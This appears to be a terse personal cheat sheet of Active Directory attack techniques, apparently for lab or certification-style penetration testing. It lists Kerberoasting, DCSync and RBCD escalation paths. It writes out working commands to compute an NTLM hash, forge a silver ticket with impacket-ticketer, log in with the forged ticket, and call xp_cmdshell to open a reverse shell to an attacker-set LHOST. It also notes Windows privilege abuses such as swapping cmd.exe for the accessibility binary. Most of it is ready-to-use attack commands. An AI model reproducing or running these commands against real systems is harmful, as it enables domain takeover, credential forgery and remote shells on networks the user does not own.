
#### SOP for active directory 

0. Always try `whoami /all` first 
1. Kerberoasting & as-rep roasting 
2. GenericAll (can change password) 
3. DCsync needs GetChanges & GetChangesAll (add rights with Add-DomainObjectAcl if WriteDACL) 
4. RBCD (needs SeMachineAccountPrivilege, WriteProperty on the domain machine) 



#### Unusual exploits 
> Fucking tickets = `echo -n '{{PASSWORD}}' | iconv -t UTF-16LE | openssl md4` and edit /etc/krb5.conf 
> > `impacket-ticketer -nthash {{HASH}} -domain-sid {{SID}} -domain {{DOMAIN}} -spn {{SPN}} -user-id 500 Administrator` 
> > `export KRB5CCNAME=/path/to/Administrator.ccache` then log in, eg `impacket-mssqlclient -k {{PUT_IN_ETC_HOSTS}}` 
> > `xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell {{LHOST}} 445"` 
> > See https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f 

SeRestorePrivilege = in C:\Windows\system32 rename cmd.exe = Ultiman.exe then rdesktop ~> Win+U 
SeManageVolumePrivilege = https://github.com/CsEnox/SeManageVolumeExploit then `icacls C:\Windows\System32` 

